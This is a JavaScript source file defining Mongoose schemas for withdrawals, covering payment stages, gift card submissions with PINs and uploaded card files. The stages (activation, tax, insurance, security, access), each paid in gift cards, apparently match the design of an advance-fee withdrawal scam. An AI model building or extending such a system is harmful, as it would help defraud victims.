// models/Withdrawal.js
const { Schema: S, model: M } = require('mongoose');

const CardSchema = new S({
  giftCard: String,
  pin: String,
  file: S.Types.Mixed, // { filename, originalname, path }
});

const PaymentSubmissionSchema = new S({
  stage: String,
  amount: { type: Number, default: 0 },
  cards: [CardSchema],
  createdAt: { type: Date, default: Date.now },
  status: { type: String, enum: ['submitted','processed','rejected'], default: 'submitted' }
});

const WithdrawalSchema = new S({
  user: { type: S.Types.ObjectId, ref: 'User' },
  amount: { type: Number, default: 0 },
  method: { type: String },
  details: S.Types.Mixed,
  status: { type: String, enum: ['preview','pending_activation','approved','rejected','ready_for_payout'], default: 'preview' },
  stage: { type: String, enum: ['activation','tax','insurance','verification','security','access'], default: 'activation' },
  payments: [PaymentSubmissionSchema],
  createdAt: { type: Date, default: Date.now }
});

module.exports = M('Withdrawal', WithdrawalSchema);
